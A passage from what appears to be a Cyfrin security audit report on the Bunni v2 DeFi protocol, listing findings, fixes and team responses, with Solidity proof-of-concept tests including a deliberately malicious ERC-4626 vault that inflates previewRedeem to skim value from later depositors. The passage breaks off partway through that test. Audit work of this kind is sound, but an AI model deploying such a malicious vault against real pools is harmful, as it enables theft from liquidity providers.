++      if (hook.getAmAmmEnabled(poolId) && topBid.manager != address(0) && !params.useQueuedWithdrawal) {
++          return (false, 0, 0);
++      }
        ...
    }
```

This function should also validate whether the sender has already an existing queued withdrawal. It is not currently possible to check this because the `BunniHub` does not expose any function to fetch queued withdrawals; however, it should be ensured that if `useQueuedWithdrawal` is true, the user has an existing queued withdrawal that is inside the executable timeframe. In this scenario, the token amount computations should be performed taking the amount of shares from the queued withdrawal.

**Proof of Concept**
First create the following `ERC4626FeeMock` inside `test/mocks/ERC4626Mock.sol`:

```solidity
contract ERC4626FeeMock is ERC4626 {
    address internal immutable _asset;
    uint256 public fee;
    uint256 internal constant MAX_FEE = 10000;

    constructor(IERC20 asset_, uint256 _fee) {
        _asset = address(asset_);
        if(_fee > MAX_FEE) revert();
        fee = _fee;
    }

    function setFee(uint256 newFee) external {
        if(newFee > MAX_FEE) revert();
        fee = newFee;
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        return super.deposit(assets - assets * fee / MAX_FEE, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

And add it into the `test/BaseTest.sol` imports:

```diff
--  import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++  import {ERC4626Mock, ERC4626FeeMock} from "./mocks/ERC4626Mock.sol";
```

The following test can now be run inside `test/BunniHub.t.sol`:
```solidity
function test_QuoterAssumingCorrectVaultFee() public {
    ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    ERC4626FeeMock feeVault0 = new ERC4626FeeMock(token0, 0);
    ERC4626 vault0_ = ERC4626(address(feeVault0));
    ERC4626 vault1_ = ERC4626(address(0));
    IBunniToken bunniToken;
    PoolKey memory key;
    (bunniToken, key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: uniformDistribution,
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.DYNAMIC_AND_STATEFUL,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            vault0: vault0_,
            vault1: vault1_,
            minRawTokenRatio0: 0.20e6,
            targetRawTokenRatio0: 0.30e6,
            maxRawTokenRatio0: 0.40e6,
            minRawTokenRatio1: 0,
            targetRawTokenRatio1: 0,
            maxRawTokenRatio1: 0,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(0)
        })
    );

    // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
    uint256 depositAmount0 = 1e18 + 1;
    uint256 depositAmount1 = 1e18 + 1;
    address firstDepositor = makeAddr("firstDepositor");
    vm.startPrank(firstDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, firstDepositor, depositAmount0 * 100);
    _mint(key.currency1, firstDepositor, depositAmount1 * 100);

    // deposit tokens
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: firstDepositor,
        refundRecipient: firstDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.prank(firstDepositor);
    (uint256 sharesFirstDepositor, uint256 firstDepositorAmount0In, uint256 firstDepositorAmount1In) = hub.deposit(depositParams);

    IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
    (uint256 idleAmountBefore, bool isToken0Before) = IdleBalanceLibrary.fromIdleBalance(idleBalanceBefore);
    feeVault0.setFee(1000);     // 10% fee

    depositAmount0 = 1e18;
    depositAmount1 = 1e18;
    address secondDepositor = makeAddr("secondDepositor");
    vm.startPrank(secondDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, secondDepositor, depositAmount0);
    _mint(key.currency1, secondDepositor, depositAmount1);

    // deposit tokens
    depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: secondDepositor,
        refundRecipient: secondDepositor,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });
    (bool success, uint256 previewedShares, uint256 previewedAmount0, uint256 previewedAmount1) = quoter.quoteDeposit(address(this), depositParams);

    vm.prank(secondDepositor);
    (uint256 sharesSecondDepositor, uint256 secondDepositorAmount0In, uint256 secondDepositorAmount1In) = hub.deposit(depositParams);

    console.log("Quote deposit will be successful?", success);
    console.log("Quoted shares to mint", previewedShares);
    console.log("Quoted token0 amount to use", previewedAmount0);
    console.log("Quoted token1 amount to use", previewedAmount1);
    console.log("---------------------------------------------------");
    console.log("Actual shares minted", sharesSecondDepositor);
    console.log("Actual token0 amount used", secondDepositorAmount0In);
    console.log("Actual token1 amount used", secondDepositorAmount1In);
}
```

Output:
```
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_QuoterAssumingCorrectVaultFee() (gas: 4773069)
Logs:
  Quote deposit will be successful? true
  Quoted shares to mint 1000000000000000000
  Quoted token0 amount to use 1000000000000000000
  Quoted token1 amount to use 1000000000000000000
  ---------------------------------------------------
  Actual shares minted 930000000000000000
  Actual token0 amount used 930000000000000000
  Actual token1 amount used 1000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.71s (4.45ms CPU time)

Ran 1 test suite in 1.71s (1.71s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** Implement the missing validation as described above.

**Bacon Labs:** Fixed in [PR \#122](https://github.com/timeless-fi/bunni-v2/pull/122).

**Cyfrin:** Verified, additional validation has been added to `BunniQuoter` to match the behavior of `BunniHub`.


### Before swap delta can exceed the actual specified amount for exact input swaps due to rounding

**Description:** When returning the `beforeSwapDelta` in `BunniHookLogic::beforeSwap`, the `actualInputAmount` is assigned as the maximum between the `amountSpecified` and the `inputAmount` calculated using Bunni swap math:

```solidity
// return beforeSwapDelta
// take in max(amountSpecified, inputAmount) such that if amountSpecified is greater we just happily accept it
int256 actualInputAmount = FixedPointMathLib.max(-params.amountSpecified, inputAmount.toInt256());
inputAmount = uint256(actualInputAmount);
beforeSwapDelta = toBeforeSwapDelta({
    deltaSpecified: actualInputAmount.toInt128(),
    deltaUnspecified: -outputAmount.toInt256().toInt128()
});
```

The intention is to accept any excess specified amount as noted by the comment shown above; however, given that the computation of the input amount rounds up in the `BunniSwapMath::computeSwap` partial swap edge case shown below, this value could slightly exceed the specified amount when it should not be the case for an exact input swap.

```solidity
// compute input and output token amounts
// NOTE: The rounding direction of all the values involved are correct:
// - cumulative amounts are rounded up
// - naiveSwapAmountIn is rounded up
// - naiveSwapAmountOut is rounded down
// - currentActiveBalance0 and currentActiveBalance1 are rounded down
// Overall this leads to inputAmount being rounded up and outputAmount being rounded down
// which is safe.
// Use subReLU so that when the computed output is somehow negative (most likely due to precision loss)
// we output 0 instead of reverting.
(inputAmount, outputAmount) = zeroForOne
    ? (
        updatedActiveBalance0 - input.currentActiveBalance0,
        subReLU(input.currentActiveBalance1, updatedActiveBalance1)
    )
    : (
        updatedActiveBalance1 - input.currentActiveBalance1,
        subReLU(input.currentActiveBalance0, updatedActiveBalance0)
    );

return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);
```

**Impact:** Rounding errors in the input amount could be propagated to exceed `amountSpecified` when this is not desired.

**Recommended Mitigation:** Only take in `max(amountSpecified, inputAmount)` if `amountSpecified > inputAmount` such that the actual input amount is not affected by rounding and exact input swaps truly are exact input; otherwise, there should likely be a revert.

**Bacon Labs:** Acknowledged, we prefer reverting in the case where `inputAmount > -amountSpecified` to be safe in case that the input amount `outputAmount` corresponds to is actually greater than `-amountSpecified` for whatever reason (likely precision errors).

**Cyfrin:** Acknowledged, the `PoolManager` will revert with `HookDeltaExceedsSwapAmount`.

\clearpage
## Informational


### References to missing am-AMM overrides should be removed

**Description:** The NatSpec of `BunniHook::_amAmmEnabled` references pool/global am-AMM overrides that appear to be missing. If, as suspected, they were they removed following a previous audit, all references should be removed.

```solidity
/// @dev precedence is poolOverride > globalOverride > poolEnabled
function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {...}
```

**Bacon Labs:** Fixed in [PR \#105](https://github.com/timeless-fi/bunni-v2/pull/105).

**Cyfrin:** Verified, the outdated comment has been removed.


### Outdated references to implementation details in `ERC20Referrer` should be replaced

**Description:** `ERC20Referrer` makes multiple references to balances being stored as `uint232`, with the upper 24 bits of the storage slot used to store the lock flag and referrer; however, this is outdated as balances are now stored using 255 bits, with the singular highest bit used to store the log flag. For example:

```solidity
/// @dev Balances are stored as uint232 instead of uint256 since the upper 24 bits
/// of the storage slot are used to store the lock flag & referrer.
/// Referrer 0 should be reserved for the protocol since it's the default referrer.
abstract contract ERC20Referrer is ERC20, IERC20Referrer, IERC20Lockable {
    /// -----------------------------------------------------------------------
    /// Errors
    /// -----------------------------------------------------------------------

    /// @dev Error when the balance overflows uint232.
    error BalanceOverflow(); // @audit-info - info: not uint232 but 255 bits
    ...
}
```

All outdated references to `uint232` and "upper 24 bits" should be replaced with the correct implementation details.

**Bacon Labs:** Fixed in [PR \#107](https://github.com/timeless-fi/bunni-v2/pull/107).

**Cyfrin:** Verified, outdated comments in `ERC20Referrer` have been changed.


### Unused errors can be removed

**Description:** The `BunniHub__InvalidReferrer()` and `BunniToken__ReferrerAddressIsZero()` errors declared in `Errors.sol` are unused.

**Bacon Labs:** Fixed in [PR \#108](https://github.com/timeless-fi/bunni-v2/pull/108).

**Cyfrin:** Verified, the unused errors have been removed.


### Bunni tokens can be deployed with arbitrary hooks

**Description:** It is understood that `BunniHubLogic::deployBunniToken` intentionally allows for Bunni tokens to be deployed with arbitrary hooks that conform to the `IBunniHook` interface but are not necessarily enforced to be the canonical `BunniHook`. As successfully demonstrated in a separate critical finding, while the raw balance and reserve accounting can appear to be robust against exploits from malicious hooks and their associated (potentially also malicious) vaults, this permisionless-ness greatly increases the overall attack surface. Additionally, as it is the `BunniHook` that handles internal accounting of the hook fee and LP referral rewards, a custom hook can simply modify these to avoid paying revenue to the protocol.

**Bacon Labs:** This was fixed in [PR \#95](https://www.notion.so/1baf46a1865c800d8f52c47682efd607?pvs=25) with the addition of a hook whitelist.

**Cyfrin:** Verified, the hook whitelist prevents deployment of Bunni tokens with arbitrary hooks.


### Unused return values can be removed

**Description:** `AmAmm::_updateAmAmmWrite` currently returns the manager of the top bid and its associated payload; however, in all invocations of this function the return values are never used. If they are not required, these unused return values should be removed.

**Bacon Labs:** Fixed in [PR \#7](https://github.com/Bunniapp/biddog/pull/7).

**Cyfrin:** Verified, the unused return value has been removed.



### Missing early return case in `AmAmm::_updateAmAmmView`

**Description:** `AmAmm::_updateAmAmmWrite` runs the state machine to charge rent and update the top and next bids for a given pool, but returns early if the pool has already been updated in the given block as tracked by the `_lastUpdatedBlockIdx` state. `AmAmm::_updateAmAmmView` is a version of this function that does not modify state; however, it is missing the early return case shown below:

```solidity
// early return if the pool has already been updated in this block
// condition is also true if no update has occurred for type(uint48).max blocks
// which is extremely unlikely
if (_lastUpdatedBlockIdx[id] == currentBlockIdx) {
    return (_topBids[id].manager, _topBids[id].payload);
}
```

While the `_lastUpdatedBlockIdx` state cannot be updated by the view function itself, the write version of the function may have already been called in the same block and as such would trigger the early return case.

**Impact:** `AmAmm::getTopBid` and `AmAmm::getNextBid` may return bids that are inconsistent with the actual state machine execution for a given block.

**Recommended Mitigation:** Add the missing validation to `AmAmm::_updateAmAmmView` so that it is equivalent to `AmAmm::_updateAmAmmWrite`, ignoring updates to state.

**Bacon Labs:** Fixed in [PR \#8](https://github.com/Bunniapp/biddog/pull/8).

**Cyfrin:** Verified, the early return in `_updateAmAmmView()` has been added for the case where the state machine was already updated the current block.


### Infinite Permit2 approval is not recommended

**Description:** When creating a rebalance order in `RebalanceLogic::_createRebalanceOrder`, the `BunniHook` approves tokens to be spent by the Permit2 contract. Specifically, if the order input amount exceeds the existing allowance, the Permit2 contract is approved to spend the maximum uint for the given ERC-20 token as shown below:

```solidity
// approve input token to permit2
if (inputERC20Token.allowance(address(this), env.permit2) < inputAmount) {
    address(inputERC20Token).safeApproveWithRetry(env.permit2, type(uint256).max);
}
```

While the `FloodPlain` pre/post rebalance callbacks no longer allow for direct calls to the Permit2 contract, this behavior is not recommended as dangling infinite approvals could still be exploited if another vulnerability were to be discovered. The `BunniHook` does not directly store the underlying reserves, but rather pulls/pushes ERC-6909 claim tokens to/from the `BunniHub`; however, it does store swap and hook fees which are paid in the underlying tokens of the pool and thus could be extracted once a rebalance order is made.

**Recommended Mitigation:** Consider moving the Permit2 approval to `BunniHook::_rebalancePrehookCallback` and resetting the Permit2 approval to zero in `BunniHook::_rebalancePosthookCallback`.

**Bacon Labs:** Fixed in [PR \#109](https://github.com/timeless-fi/bunni-v2/pull/109). Note that resetting approval to Permit2 was not added to `BunniHook::_rebalancePosthookCallback()` because `FloodPlain` always transfers the full approved amount during order fulfillment.

**Cyfrin:** Verified, infinite approval to Permit2 during rebalance has been modified to the exact amount required by the rebalance order and moved to`BunniHook::_rebalancePrehookCallback`.


### `idleBalance` argument is missing from `QueryLDF::queryLDF` NatSpec

**Description:** `QueryLDF::queryLDF` takes an argument `idleBalance` that is not currently but should be included in the function NatSpec.

```solidity
/// @notice Queries the liquidity density function for the given pool and tick
/// @param key The pool key
/// @param sqrtPriceX96 The current sqrt price of the pool
/// @param tick The current tick of the pool
/// @param arithmeticMeanTick The TWAP oracle value
/// @param ldf The liquidity density function
/// @param ldfParams The parameters for the liquidity density function
/// @param ldfState The current state of the liquidity density function
/// @param balance0 The balance of token0 in the pool
/// @param balance1 The balance of token1 in the pool
/// @return totalLiquidity The total liquidity in the pool
/// @return totalDensity0X96 The total density of token0 in the pool, scaled by Q96
/// @return totalDensity1X96 The total density of token1 in the pool, scaled by Q96
/// @return liquidityDensityOfRoundedTickX96 The liquidity density of the rounded tick, scaled by Q96
/// @return activeBalance0 The active balance of token0 in the pool, which is the amount used by swap liquidity
/// @return activeBalance1 The active balance of token1 in the pool, which is the amount used by swap liquidity
/// @return newLdfState The new state of the liquidity density function
/// @return shouldSurge Whether the pool should surge
function queryLDF(
    PoolKey memory key,
    uint160 sqrtPriceX96,
    int24 tick,
    int24 arithmeticMeanTick,
    ILiquidityDensityFunction ldf,
    bytes32 ldfParams,
    bytes32 ldfState,
    uint256 balance0,
    uint256 balance1,
    IdleBalance idleBalance
)
```

**Bacon Labs:** Fixed in [PR \#110](https://github.com/timeless-fi/bunni-v2/pull/110).

**Cyfrin:** Verified, `idleBalance` has been added to the `queryLDF()` NatSpec.


### Uniswap v4 vendored library mismatch

**Description:** The codebase makes use of modified vendored versions of the `LiquidityAmounts` and `SqrtPriceMath` libraries (excluded from the scope of this review). However, the current implementation of the modified `LiquidityAmounts` library still references the original Uniswap v4 version of `SqrtPriceMath`, rather than the intended modified vendored version. This appears to be unintentional and affects the `queryLDF()` function which performs an unsafe downcast on `liquidityDensityOfRoundedTickX96` from `uint256` to `uint128` when invoking `LiquidityAmounts::getAmountsForLiquidity` as shown below:

```solidity
(uint256 density0OfRoundedTickX96, uint256 density1OfRoundedTickX96) = LiquidityAmounts.getAmountsForLiquidity(
    sqrtPriceX96, roundedTickSqrtRatio, nextRoundedTickSqrtRatio, uint128(liquidityDensityOfRoundedTickX96), true
);
```

While a silent overflow is not possible so long as the invariant holds that the liquidity density of a single rounded tick cannot exceed the maximum normalized density of `Q96`, the `LiquidityAmounts` library should be updated to correctly reference the modified version such that the need to downcast is avoided completely.

**Bacon Labs:** Fixed in [PR \#111](https://github.com/timeless-fi/bunni-v2/pull/111).

**Cyfrin:** Verified, the custom `SqrtPriceMath` library is now used within `LiquidityAmounts` instead of that from `v4-core`.


### Unused constants can be removed

**Description:** `LibDoubleGeometricDistribution` and `LibCarpetedDoubleGeometricDistribution` both define the following constant:

```solidity
uint256 internal constant MIN_LIQUIDITY_DENSITY = Q96 / 1e3;
```

However, both instances are unused and can be removed as they appear to have been erroneously copied from the `LibGeometricDistribution` and `LibCarpetedGeometricDistribution` libraries.

**Bacon Labs:** Fixed in [PR \#112](https://github.com/timeless-fi/bunni-v2/pull/112).

**Cyfrin:** Verified, the unused constants have been removed from `LibCarpetedDoubleGeometricDistribution`.


### `LibUniformDistribution::decodeParams` logic can be simplified

**Description:** When bounding the distribution to be within the range of usable ticks in the inner conditional statement of `LibUniformDistribution::decodeParams`, the logic is made unnecessarily convoluted. Rather than recomputing the length of the distribution before bounding the ticks, existing stack variables can be used to simplify this process and avoid unnecessary assignments.

```solidity
/// @return tickLower The lower tick of the distribution
/// @return tickUpper The upper tick of the distribution
function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
    internal
    pure
    returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
{
    shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

    if (shiftMode != ShiftMode.STATIC) {
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
        tickLower = roundTickSingle(twapTick + offset, tickSpacing);
        tickUpper = tickLower + length * tickSpacing;

        // bound distribution to be within the range of usable ticks
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
@>      if (tickLower < minUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickLower = minUsableTick;
            tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
@>      } else if (tickUpper > maxUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickUpper = maxUsableTick;
            tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
        }
    } else {
        ...
    }
}
```

**Recommended Mitigation:**
```diff
    /// @return tickLower The lower tick of the distribution
    /// @return tickUpper The upper tick of the distribution
    function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
        internal
        pure
        returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
    {
        shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

        if (shiftMode != ShiftMode.STATIC) {
            // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
            int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
            int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
            tickLower = roundTickSingle(twapTick + offset, tickSpacing);
            tickUpper = tickLower + length * tickSpacing;

            // bound distribution to be within the range of usable ticks
            (int24 minUsableTick, int24 maxUsableTick) =
                (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
            if (tickLower < minUsableTick) {
--              int24 tickLength = tickUpper - tickLower;
--              tickLower = minUsableTick;
--              tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
++              tickUpper = int24(FixedPointMathLib.min(minUsableTick + length * tickSpacing, maxUsableTick));
            } else if (tickUpper > maxUsableTick) {
--              int24 tickLength = tickUpper - tickLower;
--              tickUpper = maxUsableTick;
--              tickLower = int24(FixedPointMathLib.max(tickUpper - tickLength, minUsableTick));
++              tickLower = int24(FixedPointMathLib.max(maxUsableTick - length * tickSpacing, minUsableTick));
            }
        } else {
            ...
        }
    }
```

**Bacon Labs:** Fixed in [PR \#113](https://github.com/timeless-fi/bunni-v2/pull/113).

**Cyfrin:** Verified, the `LibUniformDistribution::decodeParams` logic has been simplified.


### Potential for blockchain explorer griefing due to successful zero value transfers from non-approved callers

**Description:** When `ERC20Referrer::transferFrom` is invoked from an address that has no approval given by the `from` address, execution reverts:

```solidity
// Compute the allowance slot and load its value.
mstore(0x20, msgSender)
mstore(0x0c, _ALLOWANCE_SLOT_SEED)
mstore(0x00, from)
let allowanceSlot := keccak256(0x0c, 0x34)
let allowance_ := sload(allowanceSlot)
// If the allowance is not the maximum uint256 value.
if add(allowance_, 1) {
    // Revert if the amount to be transferred exceeds the allowance.
    if gt(amount, allowance_) {
        mstore(0x00, 0x13be252b) // `InsufficientAllowance()`.
        revert(0x1c, 0x04)
    }
    // Subtract and store the updated allowance.
    sstore(allowanceSlot, sub(allowance_, amount))
}
```

However, if both the allowance and amount to transfer are zero then execution continues uninterrupted. Instead, additional validation should be added to revert on zero value transfers to prevent non-approved callers from trigger events and making benign but otherwise unintended storage slot accesses.

**Impact:** Fraudulent event emission could be leveraged for blockchain explorer griefing attacks.

**Proof of Concept:** The following test should be added to `ERC20Referrer.t.sol`:

```solidity
function test_transferFromPoC() external {
    uint256 amount = 1e18;
    token.mint(bob, amount, address(0));

    vm.prank(bob);
    token.approve(address(this), amount);

    // zero transfer from bob to alice doesn't revert
    vm.prank(alice);
    token.transferFrom(bob, alice, 0);
}
```

**Recommended Mitigation:** Revert on zero value transfers, especially if the caller has zero allowance.

**Bacon Labs:** Acknowledged, were fine with the existing implementation. I think the existing implementation actually matches the [EIP-20 standard definition](https://eips.ethereum.org/EIPS/eip-20) more closely, which says Transfers of 0 values MUST be treated as normal transfers and fire the `Transfer` event.. This is also the behavior in popular ERC-20 implementations such as OpenZeppelin.

**Cyfrin:** Acknowledged.


### `GeometricDistribution` LDF length validation prevents the full range of usable ticks from being used

**Description:** In `LibGeometricDistribution:isValidParams`, the `length` variable represents the number of `tickSpacing`s between `minTickOrOffset` and `maxTick`. The current validation reverts when this `length` exceeds half the maximum usable range, even though this `length` can be contained between `minUsableTick` and `maxUsableTick`:

```solidity
    function isValidParams(int24 tickSpacing, uint24 twapSecondsAgo, bytes32 ldfParams) internal pure returns (bool) {
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // | shiftMode - 1 byte | minTickOrOffset - 3 bytes | length - 2 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        int24 minTickOrOffset = int24(uint24(bytes3(ldfParams << 8)));
        int24 length = int24(int16(uint16(bytes2(ldfParams << 32))));
        uint256 alpha = uint32(bytes4(ldfParams << 48));

        // ensure shiftMode is within the valid range
        if (shiftMode > uint8(type(ShiftMode).max)) {
            return false;
        }

        // ensure twapSecondsAgo is non-zero if shiftMode is not static
        if (shiftMode != uint8(ShiftMode.STATIC) && twapSecondsAgo == 0) {
            return false;
        }

        // ensure minTickOrOffset is aligned to tickSpacing
        if (minTickOrOffset % tickSpacing != 0) {
            return false;
        }

        // ensure length > 0 and doesn't overflow when multiplied by tickSpacing
@>      // ensure length can be contained between minUsableTick and maxUsableTick
        if (
            length <= 0 || int256(length) * int256(tickSpacing) > type(int24).max
@>              || length > maxUsableTick / tickSpacing || -length < minUsableTick / tickSpacing
        ) return false;
```

The `length > maxUsableTick / tickSpacing` validation intends to prevent the range exceeding the distance from 0 up to the right-most usable tick. Similarly, the `-length < minUsableTick / tickSpacing` validation intends to prevent the range exceeding the distance from 0 down to the left-most usable tick. The second case is equivalent to `length > -minUsableTick / tickSpacing`, which means that both right-hand sides of the validation have the same absolute value; therefore, together they enforce that the length of the range is no larger than the half-range with `length  |maxUsableTick| / tickSpacing`.

Similar logic is also present in `LibDoubleGeometricDistribution::isValidParams`. As such, it is not possible to deploy pools configured with either of these LDFs that wish to use the full range of ticks between `minUsableTick` and `maxUsableTick`. It is understood that this behavior is intentional and is likely related to the minimum liquidity density requirement, which would fail anyway given a large length for most reasonable tick spacings, in which case no mitigation is necessary.

**Bacon Labs:** Acknowledged, were fine with the length limitations since the limits are unlikely to be reached in practice due to minimum liquidity requirements.

**Cyfrin:** Acknowledged.


### Insufficient slippage protection in `BunniHub::deposit`

**Description:** `BunniHub::deposit` current implements slippage protection by allowing the caller to provide a minimum amount of each token to be used:

```solidity
function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
    external
    returns (uint256 shares, uint256 amount0, uint256 amount1)
{
    ...
    // check slippage
    if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
        revert BunniHub__SlippageTooHigh();
    }
    ...
}
```

This check ensures that there is not a significant change in the ratio of tokens from what the depositor expected; however, there is no check to ensure that the depositor receives an expected amount of shares for the given amounts of tokens. This validation is omitted from Uniswap because it is not possible to manipulate the total token amounts, but since Bunni can make use of external vaults for rehypothecation, it is possible for the balance of both tokens to change significantly from what the depositor expected. So long as the token ratio remains constant, value can be stolen from subsequent depositors if token balances are manipulated via the amounts deposited to vaults.

**Impact:** While users may receive fewer shares than expected, this is informational as it relies on a malicious vault implementation and as such users will not knowingly interact with a pool configured in this way.

**Proof of Concept:** Place this `MaliciousERC4626SlippageVault` inside `test/mocks/ERC4626Mock.sol` to simulate this malicious change in token balances:

```solidity
contract MaliciousERC4626SlippageVault is ERC4626 {
    address internal immutable _asset;
    uint256 internal multiplier = 1;

    constructor(IERC20 asset_) {
        _asset = address(asset_);
    }

    function setMultiplier(uint256 newMultiplier) public {
        multiplier = newMultiplier;
    }

    function previewRedeem(uint256 shares) public view override returns(uint256 assets){
        return super.previewRedeem(shares) * multiplier;
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        multiplier = 1;
        return super.deposit(assets, to);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

The following test should be placed in `BunniHub.t.sol`:
```solidity
function test_SlippageAttack() public {
    ILiquidityDensityFunction uniformDistribution = new UniformDistribution(address(hub), address(bunniHook), address(quoter));
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    MaliciousERC4626SlippageVault maliciousVaultToken0 = new MaliciousERC4626SlippageVault(token0);
    MaliciousERC4626SlippageVault maliciousVaultToken1 = new MaliciousERC4626SlippageVault(token1);
    ERC4626 vault0_ = ERC4626(address(maliciousVaultToken0));
    ERC4626 vault1_ = ERC4626(address(maliciousVaultToken1));
    IBunniToken bunniToken;
    PoolKey memory key;
    (bunniToken, key) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: currency0,
            currency1: currency1,
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: uniformDistribution,
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.DYNAMIC_AND_STATEFUL,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.STATIC, int24(-5) * TICK_SPACING, int24(5) * TICK_SPACING)),
            hooks: bunniHook,
            hookParams: abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            vault0: vault0_,
            vault1: vault1_,
            minRawTokenRatio0: 0.08e6,
            targetRawTokenRatio0: 0.1e6,
            maxRawTokenRatio0: 0.12e6,
            minRawTokenRatio1: 0.08e6,
            targetRawTokenRatio1: 0.1e6,
            maxRawTokenRatio1: 0.12e6,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(0),
            name: bytes32("BunniToken"),
            symbol: bytes32("BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(0)
        })
    );

    // make initial deposit to avoid accounting for MIN_INITIAL_SHARES
    uint256 depositAmount0 = 1e18;
    uint256 depositAmount1 = 1e18;
    address firstDepositor = makeAddr("firstDepositor");
    vm.startPrank(firstDepositor);
    token0.approve(address(PERMIT2), type(uint256).max);
    token1.approve(address(PERMIT2), type(uint256).max);
